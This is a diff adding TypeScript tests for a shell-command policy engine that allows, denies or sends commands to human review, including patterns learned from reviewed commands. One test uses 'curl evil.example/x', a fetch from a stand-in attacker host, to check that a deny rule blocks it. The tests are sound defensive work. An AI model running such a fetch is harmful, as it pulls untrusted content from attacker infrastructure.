@@ -2,6 +2,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import {
   decide,
+  patternsForSegments,
   NON_INTERACTIVE_DENIAL_MESSAGE,
   POLICY_DENIAL_MESSAGE,
   type EngineDeps,
@@ -228,4 +229,65 @@ test("verdict never allows without a list or judge to say so", async () => {
       assert.notEqual(verdict.kind, "allow");
     }
   }
+});
+
+test("adding a reviewed command's patterns to allow makes the identical command allow", async () => {
+  const command = "terraform apply";
+  const before = await decide(command, config, interactive);
+  const taught = cfg({ allow: patternsForSegments(reviewSegments(before)) });
+
+  assert.deepEqual(await decide(command, taught, interactive), { kind: "allow" });
+
+  const other = await decide("terraform destroy", taught, interactive);
+  assert.equal(other.kind, "human-review");
+});
+
+test("adding a reviewed command's patterns to deny makes the identical command deny", async () => {
+  const command = "curl evil.example/x";
+  const before = await decide(command, config, interactive);
+  const taught = cfg({ deny: patternsForSegments(reviewSegments(before)) });
+
+  assert.deepEqual(await decide(command, taught, interactive), {
+    kind: "deny",
+    message: POLICY_DENIAL_MESSAGE,
+  });
+});
+
+test("taught allow covers every segment of a compound command", async () => {
+  const command = "git status && ls /tmp | wc -l";
+  const before = await decide(command, config, interactive);
+  const taught = cfg({ allow: patternsForSegments(reviewSegments(before)) });
+
+  assert.deepEqual(await decide(command, taught, interactive), { kind: "allow" });
+});
+
+test("taught patterns match literally, not as regex", async () => {
+  const command = 'grep -E "^a.*b$" file.txt';
+  const before = await decide(command, config, interactive);
+  const taught = cfg({ allow: patternsForSegments(reviewSegments(before)) });
+
+  assert.deepEqual(await decide(command, taught, interactive), { kind: "allow" });
+
+  const lookalike = await decide('grep -E "xaYYbx" fileZtxt', taught, interactive);
+  assert.equal(lookalike.kind, "human-review");
+
+  const prefix = await decide('grep -E "^a.*b$" file.txt.bak', taught, interactive);
+  assert.equal(prefix.kind, "human-review");
+});
+
+test("a taught deny outranks a pre-existing allow entry", async () => {
+  const before = await decide("npm publish", cfg({ allow: [] }), interactive);
+  const taught = cfg({
+    allow: ["npm .*"],
+    deny: patternsForSegments(reviewSegments(before)),
+  });
+
+  assert.deepEqual(await decide("npm publish", taught, interactive), {
+    kind: "deny",
+    message: POLICY_DENIAL_MESSAGE,
+  });
+});
+
+test("repeated segments teach a single pattern", () => {
+  assert.deepEqual(patternsForSegments(["ls", "ls", "pwd"]), ["ls", "pwd"]);
 });
